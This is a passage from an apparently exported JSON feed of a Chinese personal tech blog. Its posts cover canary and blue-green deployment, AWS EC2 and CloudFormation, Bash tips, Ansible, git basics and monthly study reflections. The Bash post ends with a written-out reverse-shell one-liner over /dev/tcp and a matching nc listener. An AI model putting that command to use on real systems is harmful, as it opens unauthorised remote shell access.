Group进行Infrastructure的切换，这种切换通常在一秒之内就可以搞定。application层的回话切换以及数据库链接切换的问题，可以使用中间件解决。 对于数据库，直接从绿环境切换到蓝环境是不可能的，因为如果数据库结构发生改变的话，数据迁移需要时间。解决这种情况最理想的方法是在一小段时间把数据库变成只读状态，完成迁移后再将用户切换到蓝环境，恢复读写。如果在切换过程中仍然有数据的写入，你可以采用添加中间件的方式保存读写数据，或者在在读写过程中持续将事物发向新旧两个数据库。 灰度发布（金丝雀发布）在把应用程序发布给所有人之前，先试着把它发布给一小撮用户群，这种技术叫做金丝雀发布。金丝雀发布要解决的问题主要是缩短反馈周期，以及弥补巨大产品环境下无法进行有效容量测试所可能导致的问题的一种手段。是一个能大大降低新版本发布风险的方法。灰度发布是蓝绿部署的一个延伸，采用逐步切换的方式使新版本发布只影响到尽可能少的用户，从而为AB测试提供条件。灰度发布灰度发布与金丝雀部署在操作上是等价的金丝雀发有以下几个好处： 非常容易回滚，这个其实是蓝绿部署就已经带来的好处，只要不把用户引向有问题的新版本，就可以有足够的时间用来分析错误日志，排查问题。 可以将同一批用户引至不新旧版本以进行A/B测试，某些公司可以度量新特性的使用率，某些公司可以度量该版本带来的收益，你不必将大量用户引入A/B测试，只需要有代表性的样本就足够了。 可以通过逐渐增加负载，记录并衡量应用程序响应时间，CPU使用率，I/O，内存使用率以及日志中是否有异常报告这种方式来检查应用程序是否满足容量需求，降低容量测试不理想带来的风险。 另外，需要注意的是，在生产环境中保留尽可能少的版本也是非常重要的，最好限制在两个版本之内。 其他 紧急修复：一定不要破坏流程，不要直接对生产环境进行修改。 持续部署：If it hurts, do it more often 持续发布用户自行安装的软件？发布方式？ 执行部署的人应该参与部署过程的创建（Dev和Ops的紧密合作） 记录部署活动（自动化更佳） 不要删除旧文件，而是移动到别的位置。在Unix环境中，一个最佳实践是把每个版本部署到不同的文件夹中，创建一个符号链接文件指向最新版本，版本的部署和回滚就只是改一下符号链接这么简单。 部署是整个团队的责任（DevOps） 快速失败，部署脚本也应该纳入测试中，这些测试应该被作为部署的一部分来工作。 数据库最好向前兼容","tags":[{"name":"持续交付","slug":"持续交付","permalink":"https://www.duyidong.com/tags/持续交付/"},{"name":"DevOps","slug":"DevOps","permalink":"https://www.duyidong.com/tags/DevOps/"},{"name":"部署与发布","slug":"部署与发布","permalink":"https://www.duyidong.com/tags/部署与发布/"},{"name":"持续部署","slug":"持续部署","permalink":"https://www.duyidong.com/tags/持续部署/"}]},{"title":"AWS EC2是什么","date":"2016-09-28T06:53:34.000Z","path":"2016/09/28/AWS-EC2/","text":"Amazon Elastic Compulte Cloud(EC2)提供了可伸缩的计算资源，使你可以快速开发/部署你的应用，有了它你可以快速起一个应用，配置安全，网络，以及存储。他可以更灵活，更快地适应你对需求。 EC2定义了以下规则 Instance: 虚拟计算环境 AMI(Amazon Machine Images): EC2环境的一个预配置 Instance type: instance的存储，CPU，内存，存储，网络，地位 Key pair: 用于安全登录你的instance（Amazon保存piublic key,你需要小心保存自己那份private key） Instance store volumes: 临时存储数据，当你stop或者terminate你的机器的时候就会被删除 EBS(Amazon Elastic Block Store) 长期存储volume的数据 Regions AZ 给你的资源多个物理地址 Security Group 防火墙，用于定义通信策略，端口，可通信网段 Tags 元数据（metadata）可以与资源绑定 (VPCs)virtual private clouds 虚拟网络，你可以配置用于和你自己的网络通信 AWS提倡的是低费用，只为你用到的服务买单，可伸缩，可测量，帮助你快速将资源和需求对应起来，灵活地run你的软件，让你可以将你的想法更快地实施到市场。 学习AWS EC2总共分几步：basics Instance and AMIs Regions and Availablity Zones Instance Types Tags Networking and Security Amazon EC2 Key Pairs Security Groups Elastic IP Addresses Amazon EC2 and Amazon VPC Storage Amazon EBS Instance Store 和EC2有关的服务 ELB（Elastic Load Balancing） 在不同的instance之间自动分发进来的请求 CloudWatch 实现监视器功能用于监控你的instance CouldTrail 监控所有通向EC2的call，包括AWS console commandline tools以及其他服务 如何操作EC2资源CLI PowerShell 工具AWS提供接口为HTTP或者HTTPs的请求提供响应。可以在 Amazon EC2 API Reference里面设置响应（Action）如果你想使用语言接入，AWS也提供SDK工具 付费方式可以按小时付费（大部分时候我们采用这种方式），也可以先预付一笔钱，然后保留一到三年，这样会比较便宜一些。还有竞价方式，这个不需要太了解。 Security Best Practice 使用IAM(AWS Identity and Access Management)控制AWS资源的访问权限 设置Security Group用于仅允许信任的设备接入开放的端口 经常review你的Security Group设置，确保你赋予了“最小可用权限”，为不同的网络需求创建不同的SG 禁止密码登录","tags":[{"name":"AWS","slug":"AWS","permalink":"https://www.duyidong.com/tags/AWS/"}]},{"title":"2016八月学习小计","date":"2016-09-01T11:27:38.000Z","path":"2016/09/01/2016八月学习小计/","text":"基本上讲，这两个月一直都在写文档，做PPT，提升所谓Consultant能力。除此之外比较系统地学习了Shell和一些Linux有关的知识，自认为自身短板还是在技术上。 个人觉得以下分析问题的方式还是比较面向过程和面向任务，比较适合团队Retro，并不是很适合做自我总结。不过还是想试一下。 内容回顾Technique Shell(Done) Linux(In porgress) Commuity Shell Workshop(Done) 搜集整理团队资料(In porgress) LeaderShip CAT release standard(In porgress) Take wish wall job Workflow Confulunce DevOps Onboarding Guilde(Done) 看完了《持续交付》和《敏捷故事》 分析总的来说过去两个月值得记住的事太少了，唯一觉得有所收获的就是学了下shell，在每个维度上的学习都不够深入，主要还是精力太分散所致，DevOps确实有很多坑，比如说你不能像做开发一样专注于一件事，但好处是你可以从更宏观的角度来看一个项目，应该说做事情的节奏是可以自己调整的，能从整体架构的角度看问题还是比较令人兴奋的。但是，目前来说中心偏离了技术，就偏离我的意愿了。其实还有比较困惑的点是自己思维方式的能力，思维方式肯定不是以多为好，我们总是会为一个新观点感到醍醐灌顶，但是总会有新的新观点让我们的思考被颠覆，但我们依然不能放弃追逐真理。。恩。那些很牛逼的人，并不是脑子转的有多快，而是你问他的问题他以前就思考过了，甚至回答过别人了，甚至参考过别人的回答，甚至将自己的答案发表过，在网上和别人激烈的讨论过，所以当你刚刚开始思考这个问题的时候他已经有了比较自信也比较完整的答案。他不是比你聪明，只是走在了你前面。那么如何成为一个比较聪明的人呢？ 在别人遇到问题之前先发现问题 反复咀嚼遇到过的问题 记住你的解决方案，并帮助身边的人解决同样的问题 这样的成长轨迹很容易应用于技术领域，事实上一个程序员的成长很多就是按照这样的轨迹来的，但是如果把这个本领用于咨询，就变得困难了许多，因为描述问题本身就是一个问题，就跟早期的机器学习算法的建模一样，模型建的号，机器算法就优，技术领域的问题被封闭的语境限制着，所以能够有明确的答案，所以咨询的难点就变成了语境的建立和同一，比如“敏捷”，“精益”，一说这个语境，就好比技术上讲一个框架，这种方式适用于什么样的场景，有哪些优劣，一下就有了，我们在语境下的讨论就会变得有着落，明确，保证了沟通的效率。回到学习能力建设的问题上来吧，虽然我们说没有一个确定的标准来构建你的知识体系，但是冥冥之中每个人都是有自己的standard的，比如说你至少认为人有理性和感性两个向量，比如说你认同三维比二维能更清楚地描述问题。所以标准的建立有助于问题的分析和思考。 Well Bash workshop做的还不错 对项目架构有了进一步认识 对敏捷的工作方式更加熟悉了 看问题的角度从一个开发提升到架构的层面 Lesswell 太久不写代码，感觉都要生疏了 一直在写Document，做PPT，感觉没有在做有价值的工作。 思维方式和思考能力并没有提高，只是换了个看问题的的角度 Suggestion 如果可能的话，希望多集中精力在技术上一点的成长 希望自己的文档和思维方式更加结构化，可以在几种结构之间切换，但是得变得容易被人理解，容易传播，最好是发人深省 多看书，看书，看书 ActionRole-MapTodo-list下个月的学习计划主要是考取AWS认证，看几本书，以及尽快完成release standard AWS认证： 多看几篇文档，希望能够产出几篇博客 关于看书，主要是在TWI之前，希望能把手里的两本看完，产出Session吧 关于Release Standard，尽量在本周内完成 git,Linux 凤凰式部署","tags":[{"name":"学习","slug":"学习","permalink":"https://www.duyidong.com/tags/学习/"},{"name":"小计","slug":"小计","permalink":"https://www.duyidong.com/tags/小计/"}]},{"title":"Bash学习小计","date":"2016-08-05T00:09:15.000Z","path":"2016/08/05/Bash学习小计/","text":"最近一段时间在学习Bash，作为一个小总结，记录一些bash使用的技巧以及知识点。 Shell是什么？shell是一类解释性语言，通过其解释器与操作系统内核进行交互，shell分为Bshell 和Cshell两大类，我们所熟悉的bash和zsh都属于Bshell一类。shell脚本有两种执行方式，一种为交互式执行，即通常我们在Linux上的执行方式，一次只能执行一条命令（当然你可以把多条命令写到一行），多条命令不能同时执行。另一种方式为脚本执行，即把多条shell语句写到一个.sh文件里，然后在文件头#！/bin/bash调用解释器执行，这种方式的优点在于可重复执行和自动化。但shell的脚本通常不易读，所以展现shell优势的地方主要还是在交互执行中。另外可以在/etc/shells文件里查看当前系统支持的shell。bash作为大部分类Linux系统的标配，下面我主要围绕bash来讲。 Bash启动顺序1./etc/profile :此文件为系统的每个用户设置环境信息,当用户第一次登录时,该文件被执行。并从/etc/profile.d目录的配置文件中搜集shell的设置。2.~/.bash_profile:每个用户都可使用该文件输入专用于自己使用的shell信息,当用户登录时,该文件仅仅执行一次!默认情况下,他设置一些环境变量,执行用户的.bashrc文件。3.~/.bashrc:该文件包含专用于你的bash shell的bash信息,当登录时以及每次打开新的shell时,该文件被读取。4.~/.bash_logout:当每次退出系统(退出bash shell)时,执行该文件。 注意 ~/.bash_profile 是交互式、login 方式进入 bash 运行的 ~/.bashrc 是交互式 non-login 方式进入 bash 运行的 通常二者设置大致相同，所以通常前者会调用后者。 所以我们通常会吧环境变量的一些设置保存在~/.bash_profile中，把一些命令行，脚本调用写到~/.bashrc里面 Bash快捷键用好你的Control键Control键是所有类Unix系统（Mac, Linux）下一个非常有用的按键，但也是一个经常被忽视的按键，特别是在Mac平台下，Command键完全代替了在Windows平台下的Ctrl键，很多人不清楚为什么Apple又额外加了一个Control键，我想这和著名的Emacs编辑器有关，Emacs下有很多方便的快捷键，其中很多都需要用到Control键，Mac系统就原生继承了很多这些快捷键，下面就根据我在实际开发过程中遇到的具体情况来总结一下如何用好Control键，效率真能提高不少。 Control的常用组合键移动类 Control-F 前进光标 (效果同右方向键) Control-B 后退光标（效果同左方向键) Control-P 光标上移（效果同上方向键） Control-N 光标下移（效果同下方向键） Control-A 光标移动到行首 Control-E 光标移动到行尾 删除类 Control-D 删除光标后面的一个字符 Control-H 删除光标前面的一个字符 Control-K 删除当前行光标以后的所有字符 Control-W 删除光标前的一个单词 Control-U 删除当前行的所有字符其它类 Control-T 交换光标两边的字符 Control-L 清屏(仅适用于终端下)一些常用场景 通常情况下，上下左右键都远离主键盘区，如果在你高速打字的过程中需要移动输入光标位置，这个时候直接通过上下左右键就不得不将右手移出主键盘区，就会降低输入的速度，通常这个时候你就可以通过Control的组合键达到快速移动光标的目的。再比如你在一些IDE(Xcode,Android Studio等)里面选择代码补全的不同候选项时，就可以通过Control-P与Control-N来达到切换选择不同候选项的操作. Mac的键盘上没有Home与End键, 如果你想将光标快速移动到行首与行尾就比较麻烦(当然你可以通过Command与-&gt; 或Command与&lt;-实现,但这样你又需要去操作方向键, 方向键远离主键盘区, 速度势必会降低), 这时你就可以通过Control-A 与 Control-E实现, 这两个组合键非常适合在终端下使用 有些时候你在终端下输入了很长的命令, 但发现输入有误, 需要完全删除重新输入, 通常情况下你都会使用Delete键去做, 但Delete只能一次删除一个字符, 速度很慢, 这时你就可以通过Control-U键快速的达到清除当前所有输入的目的, 再比如你当前的输入只有从中间某个位置向后是错误的, 这时你可以通过Control-B或Control-F将光标移动到对应位置, 然后再利用Control-K快速达到删除当前光标后所有输入的目的 在输入的过程中如果发现个别字符不对需要删除重新输入, 你当然可以通过Delete键达到, 但 Delete键和方向键一样有点远, 更方便的你可以通过Control-D 与 Control-H实现, 还有些时候错的不是一个或几个字符,而是一个或几个单词你可以Control-W达到 在终端下如何清屏? 很多人都是通过输入clear达到, 但如果这时你终端里正输入的有一条待执行的命令,这条命令的输出可能有很多你想清一下屏后再执行, 你怎么办,总不能删除当前命令后再输入clear命令, 然后再重新输入刚才的那条命令吧, 其实这时你可以通过Control-L组合键达到目的,这个差不多是我在终端下用的最多的一个快捷键了. 关于编辑模式的设置在交互式执行bash中，可以通过set -o的方式查看当前编辑模式，我们通常采用set -o emaces的方式设置以上快捷键为可操作，需要注意的是，如果你不选择一种快捷键设置”set +o emaces”你连最熟悉的上下键切换history命令都用不了。 Aliasbash的一个将长命令替换为短命令的方式，可以直接在bash交互执行中输入alias查看已经被设置的快捷键，以alias la=&#39;ls -al&#39;的方式设置快捷键，当然直接键入命令只对当前打开的shell有效，如果想长期生效，我们通常的做法是把它写到/etc/profile.d/目录下的shell里面，会被/etc/profile调用的一个全局配置。当然在工作环境中我们会把它配到home目录下（因为/etc目录下会对所有用户生效，想想也是不科学的）所以我们更经常写到~/.bashrc里面。 关于环境变量bash的环境变量可以用set env 两种方式查看，这里主要说一下两种变量的区别，当你在命令行中用赋值的方式申明一个变量，(example: TEXT=123)，这个变量只存在set中，即当前shell生效，不会传递到subshell里面，如果是文本执行的脚本，这种变量申明方式定义的变量也只会在文件内生效，如果想让别的脚本调用这些变量,可以通过export的方式将变量导入到env里面，可以理解为全局变量。这里我还想提一个比较有意思的环境变量PS1，你可以将它设置为export PS1=&quot;(\\!) \\[\\e[31m\\] \\[\\A\\] \\[\\e[32m\\]\\u@\\h \\[\\e[34m\\]\\w \\[\\e[30m\\]$&quot;试一下，是个非常有意思的值。 Windows和Linux脚本的转换问题我们都知道windows和Linux的文件类型不同，那么在windows下编写的脚本如何在Linux下执行呢？当我们从windows下拷贝一个文件到Linux上，可以使用cat -A命令查看到文件隐藏字符，发现有很多脏数据，于是可以用dos2unix file.sh的方式把文件转化过来。 关于历史命令history可以查看当前用户的历史命令，每个用户的history藏在~/.bash_hitory下，可以查看。可以使用!!执行上一条命令 ![number]执行第number条命令，！[string]执行以string开头的上一条命令另外control+r可以根据字符串快捷搜索历史命令. 关于参数传递 `` $() 这两种方式是相同的，即重新打开一个shell执行完退出，并使用返回值代替脚本调用部分内容 | xargs 区别于管道符，是将前面的命令作为后面命令的命令参数，而管道符是将前面输出作为后面命令的标准输入。 再解释一 | 和 | xargs 的区别： echo -l | ls 输出： 等同于 ls echo -l | xargs ls 输出 等同于 ls -l 好了，剩下的自己体会。 find 的 -exec xargs有个缺点，在大量执行命令（成千上万）的时候可能因为执行的命令过多失败，而find的-exec 是为逐个命令执行，不会遇到此类问题，作为-exec的标配，应该在后面加上{} \\;末尾的\\;其实是转意，恩，此处按下不表。 关于文件查找find 是一个事实文件便利工具，比较强大,可以用find / -name &quot;*.sh&quot;的方式查找/中包含.sh结尾的文件，如果遇到一堆permission deny的问题可以用输出重定向的方式解决find /-name &quot;*.sh&quot; 2&gt;&gt; /dev/null（2为文件状态符，0表示标准输入，1表示标准输出，2表示错误输出，&gt;&gt;为重定向，表示将输出叠加导入到后面的文件中,/dev/null为Linux系统的垃圾桶）,这个命令比较常用，但是效率很低，占用内存也比较高，推荐使用locate命令，类似于window系统里的everything，将文件信息保存在/var/lib/mlocate/mlocatedb数据库里，使用updatedb更新数据库，locate filename的方式查找文件，更高效，速度也更快。 关于bash_history放一个bash_histroy的命令：http://rockhong.github.io/history-in-bash.htmlbash使用的历史命令会先写入内存（在退出subshell之前在.bash_history中不可见，也不可传递到子进程），在退出shell的时候写入子进程。这里说几个对bash_history的需求以及解决方案。 多个终端不覆盖history:如果同一用户在不同终端登录，bash_histroy只能保存最后一个用户登录的bash_histroy，解决这个问题：简单来说，你在.bashrc里面添加这句就够了： shopt -s histappend history上限设大：# 设置历史记录条数 export HISTFILESIZE=40000000 # 设置显示历史记录条数 export HISTSIZE=10000 history定期备份很多情况下我们希望保存更多的bash_history以方便以后查阅，但是如果把.bash_history设置得很大的话，bash在启动时会占用大量内存（100000条大概要10M），这是我们不想看到的，所以应该养成定期备份的习惯，推荐把bash_histroy按时间备份比如每天+data&gt;&gt;bash_histroy.back. 关于sudo这里我要说的是用户切换大家都知道su命令是用来切换用户的，su - 可以完全切换到用户（新开一个shell，加载~/.bash_profile及~/.bashrc），但是在有的情况下，sudo -iu 也可以切换用户。首先：sudo -i 是以root身份新开一个shell，sudo -u &lt;user&gt; &lt;command&gt;是以user身份执行command，现在我要说一条神奇的命令： sudo -iu &lt;user&gt; 它等价于sudo -u root &lt;user_shell&gt;是不是很神奇？我们来看一个更神奇的:visudo(当然需要root身份或者sudo权限)，编辑/etc/sudoers（或者/etc/sudoers.d/文件下的文件），添加如下代码： user1 ALL=(user2) NOPASSWD: &lt;user_shell&gt; 就可以让user1免密码sudo到user2，是不是很有趣。顺便说一下你可以使用这个配置来管理所有sudo权限。 另外记几个Linux下的常用工具1. tldr 查看文档用的，安装比较复杂，而且是联网查找，虚拟机上速度可能会比较慢 sudo yum -y install epel-release sudo yum -y install python-pip pip install --upgrade pip pip install tldr 2. tmux 据说是screen的进阶版，分屏用的 3. lsof端口查看 4. nc网络瑞士军刀，占用端口:nc -k -l -p 8080 2&gt;&gt; /dev/null 5. shudown 可以定时关机，重启，取消关机 6. pstree 进程树 7. grep 逐行扫描文件 8. wc 统计 9. top 查看内存等信息 10. rpm 包管理（二进制包） 11. sl 仅仅是为了好玩，小火车开过。。 12. cmatrix 也是为了好玩，黑客帝国 最后说一下Bash和Zsh哪个好当然是Zsh好啦，具体怎么好，你不需要太知道，总之Zsh比Bash很多地方都要强大，在Bash的基础上增加了一些配置。。 记一个Bash遇到的小坑Bash的变量只会被扫描替换一遍，所以当我们的变量里包含其他变量我们需要扫描两遍需要使用eval，类似于python的eval()将字符串当做表达式，用法如下： #!/bin/sh s=Start Start_ops=hello name=$1 echo &quot;$s&quot;&quot;_ops&quot; eval echo \\$&quot;$s&quot;_ops &quot;$name&quot; 运行 ./test.sh world打印出hello word 但是！！我现在要说的是请不要使用这种方式，因为邪恶的eval会引起bash注入的问题，就提示到这里，剩下的自己感受。。 推荐一个Linux命令查询的网站http://man.linuxde.net/ 再列一堆Linux下贼好用的工具https://gist.github.com/ADU-21/170a6d0f8756935cead9361bdea0bc67 另外： 后面还得写一个关于vim的快捷操作的文章。 Bash 反弹Shellbash -i &gt;&amp; /dev/tcp/x.x.x.x/2333 0&gt;&amp;1 # 然后在x.x.x.x这台server上执行： nc -l 2333","tags":[{"name":"学习","slug":"学习","permalink":"https://www.duyidong.com/tags/学习/"},{"name":"小计","slug":"小计","permalink":"https://www.duyidong.com/tags/小计/"},{"name":"Linux","slug":"Linux","permalink":"https://www.duyidong.com/tags/Linux/"},{"name":"Shell","slug":"Shell","permalink":"https://www.duyidong.com/tags/Shell/"}]},{"title":"AWS之CloudFormation","date":"2016-08-02T13:36:04.000Z","path":"2016/08/02/AWS之CloudFormation/","text":"CloudFormation简介通过前面的学习我们已经知道了AWS为我们提供服务的方式是将现实世界中的各种需求抽象为很多服务，CloudFormation是一种被定义为管理工具的服务，其作用是把AWS提供的服务按一定方式组合起来，自动化而且可纳入版本管理，作为基础设施及代码的典型应用 应用场景CloudFormation从小到一个EC2大到一个企业级web服务都可以用一个cloudfomation自动生成。 如何工作使用CloudFormation意味着使用模板（template）创建stack。一个模板可以包含一个或者多个资源的信息，并且包含资源之间的关联关系。当你加载一个CloudFormation，你需要一定的权限，这个权限将用于创建指定的资源。","tags":[{"name":"AWS","slug":"AWS","permalink":"https://www.duyidong.com/tags/AWS/"},{"name":"基础设施即代码","slug":"基础设施即代码","permalink":"https://www.duyidong.com/tags/基础设施即代码/"},{"name":"DevOps","slug":"DevOps","permalink":"https://www.duyidong.com/tags/DevOps/"}]},{"title":"2016六月学习小结","date":"2016-07-07T13:46:15.000Z","path":"2016/07/07/2016六月学习小结/","text":"不知不觉进入ThoughtWorks已经快两个月了，两个月以来不能说没有变化，但是心境确是经历了起伏波折，七月的主题是，危机，让我存活。 上月回顾来到ThoughtWorks的一个阶段的任务应该概括为能力基线建设，基本算是达标，另外，英语和沟通的提升还是差强人意。 六月一览六月份很长的时间都在睡不醒的状态，刚找到新工作，很多事情都没有理顺，孤独感一如既往地拜访，同时我发现一个问题，我看问题的时候太自我，太个人化，缺乏全局观。恩，这是我需要解决的自己的问题。六月在公司做了的事情基本上只有摸索，尝试不同的学习方式，成效不是很明显.应该说在六月我取得了以下技能：Ansible: 知道了这是一款自动化配置管理工具，和它的一些常见的使用方法。AWS：学会并使用了AWS的EC2,S3,RDS,VPC,IAM,Cloudformation，云服务应该是我在这个项目中最感兴趣的地方。Linux:应该说掌握了一些shell命令，但是还不熟练，也不系统，Vim可以简单使用了，但是对于高级操作基本上还是知道得很少。Jenkins：因为项目上用到，所以Jenkins可以说还算比较熟悉。思维模式：开始意识到自己的思维很多时候并不够逻辑严谨，不成系统，这是需要锻炼和改进的地方。英语水平：基本满足项目需求了，但是在表达自己的意思，和一些书面的用法上还差得很远。git: 虽然重新学习了一下git,但是效果并不理想，还是不够系统，没有学到点子上。做一个简单的总结，六月份的学习大部分时候都是在完成别人安排给我的任务，自己缺乏主动性，也没有真正主动地去学习什么，从压力的适度性上来讲，整体压力是不够的，导致前期的懈怠，然后后期压力加大又有些受不了。所以自己需要调整学习节奏，便主动为被动，同时安排好后期的学习任务，在保证新知识正常吸收的前提下，还要把旧的还没有做的事情给做了。 未完成我需要翻译博文给我的那份文档，然后要把WordPress做到动静态文件分离之后部署在AWS的资源上，我需要学习nodejs，我需要系统地学习一下Linux和git，以及学习java的web编程，在一个以java为主要技术栈的团队里，这应该是必不可少的。公司的study和people制度并没有想象中那么理想，革命主要还是靠自觉。周五再分点过一下人物，安排一下在下周必须完成旧任务以进行下一轮的学习。 七月计划主要是准备AWS认证。另外一个关于Ansible+AWS的session既然答应下来了还是把它讲了吧，也作为本月的一个output。其实后来反省了一下自己，做事不能带情绪。做事就是做事，不要一开始就带着一种观点，或者把对别人的偏见带到工作中，情绪化是我的一大弱点，不管是在写文档的时候还是在观点碰撞的时候，需要注意。对于接下来的时间我有三个要求：1.认真讲那个show case，尽量让他变成一个有意义的事情。2.开始看AWS文档，准备AWS认证初级考试。（看得比较慢一开始可以尝试翻译）3.重新开始看书，从Linux开始，看程序员该看的书。(今后写东西尽量做到逻辑性强一些，思维结构尽可能清晰，然后就是对上一阶段的总结和下一阶段的计划分别不超过三件事，这样让我集中精力也更容易抓住重点。) 写在最后一直想有一个关于旅行的分享，不知道在公司能不能有这个机会，下个月的任务应该包含这部分的内容，走得太快了，真的快要忘记自己了。书也不看了，这个月真的不是很在状态，七月加油！","tags":[{"name":"学习","slug":"学习","permalink":"https://www.duyidong.com/tags/学习/"},{"name":"小结","slug":"小结","permalink":"https://www.duyidong.com/tags/小结/"}]},{"title":"Ansible学习小记","date":"2016-06-15T12:30:46.000Z","path":"2016/06/15/Ansible学习小记/","text":"Ansible是什么借助官网上的一句话，ansible is a simple IT automation, 即ansible 是用于IT自动化管理的一个工具 诞生背景在传统小规模开发中，我们在开发机上开发，在Linux服务器上部署，整个过程只需要一个人操作，运维既是在开发机上开发，测试，然后选个凌晨两三点的时间把打包好的字节码文件复制到服务器上，这种开发生产环境用不着自动化配置管理工具。但当我们的开发升级到数十个人的团队，服务器多达数台，这种操作方式的弊端就会显露出来，一是多人协作带来的开发环境和生产环境不一致导致开发环境可用的代码到了生产环境（服务器）上变得不可用，二是多台服务器的重复配置带来的工作内容的冗余，一定程度上降低了我们的生产效率。这种时候运维的角色开始逐渐显现出来。这种级别的运维，通常只需要一些python或者bash脚本就可以实现自动化部署，配置服务器等功能。再加上规范的文档，基本可以解决团队之间的沟通问题。但是随着产品迭代周期的加长，团队的扩大，问题也随之而来，实践中脚本的不易维护，程序员们不愿意更新文档等问题逐渐暴露出来。于是市面上诞生了一批以”代码即文档”为核心思想的自动化配置管理工具，Ansible就是其中之一。 操作方法ansible主要由几个部分租成，其核心是inventory文件和yaml编写的playbook，按照最佳实践的标准，一个完整的ansible文件应该具有以下结构： production # inventory file for production servers staging # inventory file for staging environment group_vars/ group1 # here we assign variables to particular groups group2 # &quot;&quot; host_vars/ hostname1 # if systems need specific variables, put them here hostname2 # &quot;&quot; library/ # if any custom modules, put them here (optional) filter_plugins/ # if any custom filter plugins, put them here (optional) site.yml # master playbook webservers.yml # playbook for webserver tier dbservers.yml # playbook for dbserver tier roles/ common/ # this hierarchy represents a &quot;role&quot; tasks/ # main.yml # &lt;-- tasks file can include smaller files if warranted handlers/ # main.yml # &lt;-- handlers file templates/ # &lt;-- files for use with the template resource ntp.conf.j2 # &lt;------- templates end in .j2 files/ # bar.txt # &lt;-- files for use with the copy resource foo.sh # &lt;-- script files for use with the script resource vars/ # main.yml # &lt;-- variables associated with this role defaults/ # main.yml # &lt;-- default lower priority variables for this role meta/ # main.yml # &lt;-- role dependencies webtier/ # same kind of structure as &quot;common&quot; was above, done for the webtier role monitoring/ # &quot;&quot; fooapp/ # &quot;&quot; 这里我挑几个重点讲：site.yml是ensile playbook的入口文件，执行该文件会依次找到inventory文件，找到hosts组，然后ssh到目标机器组的host上，开始执行task。task是通过调用ansible模块的方式，在远程设备上执行命令来实现配置的，所以理论上可以通过命令行操作的操作，ansible都可以执行。以下为一个task: -name: install npm sudo: yes yum: name: npm state: present 该task使用了ansible的yum模块，用于检测远端设备上是否部署了nam，如果没有部署，ansible会进行yum install nam 操作进行安装，安装成功，显示ok，失败则抛出异常并中断ansible执行。 几款自动化配置工具我没有使用过其他自动化配置管理工具，在此仅对ansible做进一步介绍ensile的底层实现使用python，在Linux上支持较好，windows支持较弱，因为生产环境和测试环境通常都是Linux操作系统，所以这点无伤大雅。你可以理解成Ansible就是对一批python脚本的封装,你只需要更改一些yams文件就可以达到控制服务器配置版本信息的目的，关于yams语法：http://www.ansible.com.cn/docs/YAMLSyntax.html 如何使用Ansible的不足之处ansible作为一种自动化管理工具实践，形成了一种标准 ，这种标准在实践的过程中难免会有一些不足，比如说既定的命令行和Ansible模块之间的使用存在着一定差距，需要使用的命令行不一定在Ansible中能够找到对应的模块。另外Ansible对于变量的管理也令人诟病，大量的Ansible-playbook如果不按照最佳实践管理变量，或者大量使用冗余变量，会导致文件层级增多，非常难以阅读。。所以在一开始编写Ansible的时候推荐参照最佳实践。但同时我觉得最佳实践文件分德有点太细了，比如说task和vars分开的方式并不能适应很多场景。。好吧但总的来说，Ansible仍是目前管理Linux平台的一个不错的工具。 work with ansible这是我写的一个Ansible文件用来create 一个instance 然后在instance上自动化部署我的博客： https://github.com/ADU-21/create_hexo_in_ec2_with_ansible 下面我来教大家一起写一个自己的ansible-playbook首先创建一个host.ini文件: [host] localhost 这个文件用于指定配置的机器接下来是ansible.cfg，用于指定ansible-pylbook的参数这里包含了inventory和登录到远程设备需要的private key以及remote user: [defaults] inventory = host.ini private_key_file = ~/.ssh/devenv-key.pem remote_user = ec2-user 最后是site.yml，也就是我们的playbook，其工作原理大致是ssh到指定机器上然后执行ansible模块对应的python脚本从而进行社别的配置。 - hosts: local connection: local gather_facts: False roles: # - create_instance - create_instance_with_cloudformation - hosts: test roles: - config_instance - test_hexo 这和playbook执行的role包含以下含义：从本地连接到local这个组里面的设备，然后执行创建instance 和配置instance 最后测试hexo的工作。接下来在role中是更多的yams使用ansible的模块来达到配置设备的目的。。我就不一一解释了，关于yaml语法可参照文档： http://docs.ansible.com/ansible/YAMLSyntax.html 关于ansible的模块可参照文档： http://docs.ansible.com/ansible/index.html","tags":[{"name":"工具","slug":"工具","permalink":"https://www.duyidong.com/tags/工具/"},{"name":"基础设施即代码","slug":"基础设施即代码","permalink":"https://www.duyidong.com/tags/基础设施即代码/"},{"name":"DevOps","slug":"DevOps","permalink":"https://www.duyidong.com/tags/DevOps/"},{"name":"Ansible","slug":"Ansible","permalink":"https://www.duyidong.com/tags/Ansible/"},{"name":"自动化运维","slug":"自动化运维","permalink":"https://www.duyidong.com/tags/自动化运维/"}]},{"title":"程序员入门之git","date":"2016-05-29T02:49:08.000Z","path":"2016/05/29/程序员入门之git/","text":"代码版本管理工具在生产环境下的开发过程中，一个工程的代码通常是有多个程序员协同完成，这就涉及到代码在不通终端的同步问题，基于此需求，我们产生了代码版本工具，目前比较主流的两种为git和SVN git 与 SVN关于git和SVN的区别，网上有很多，根据笔者使用的经验，感觉git还是要比SVN先进一些，首先git是一个分布式版本管理系统，SVN更像是一个储存代码的仓库，管理员可以给不同的代码提交者提供不同的权限，仅此而已。git于SVN相比明显的优势在于不依赖网络，对分支管理有更好的支持，命令行简介好用（SVN也有命令行工具，但很多公司还是采用图形化界面） git介绍git是Linux的创始人Linus于2005年花了大概两周时间用C语言编写的分布式版本控制系统。 git使用安装在控制台输入git 如果弹出提示信息，则跳过此步骤 mac可以使用homebrew安装 brew install git homebrew作为程序员mac的标配，如果你还没有安装，请键入： /usr/bin/ruby -e &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)&quot; 也可以安装xcode，自带git windows到官网下载安装:http://msysgit.github.com/ Linuxyum install git-core 或者： apt-get install git 配置在命令行输入： git config --global user.name &quot;Your Name&quot; git config --global user.email &quot;email@example.com&quot; 改配置用于识别代码提交者身份 使用代码提交git init #创建代码版本库 git add . #将当前目录下所有文件加入版本库 git commit -m &quot;message&quot; #提交代码 git status #查看工作区状态 git diff #查看代码更改 git log #查看提交日志 版本回退git reflog #查看所有日志，包含head信息 git reset --hard HEAD^ 会退到上一版本 git reset --hard &lt;commit_id&gt; 会退到指定版本 撤销工作区修改： git checkout -- file 远程仓库这里以github为例从远程仓库克隆代码: git clone https://github.com/username/projectname.git 如果想讲本地已有的代码推送到远程，则需要跟远程费分支建立连接与远程分支建立联系，需要remote origin git remote add origin https://github.com/username/projectname.git #添加远程分支 git push origin master #推送本地origin分支到master分支 如果提示有冲突，则需要先pull 下来，修改之后再push 分支管理git中，一个分支为一个工作环境，分支与分支之间可以执行创建和合并操作。分支的一般使用： git branch # 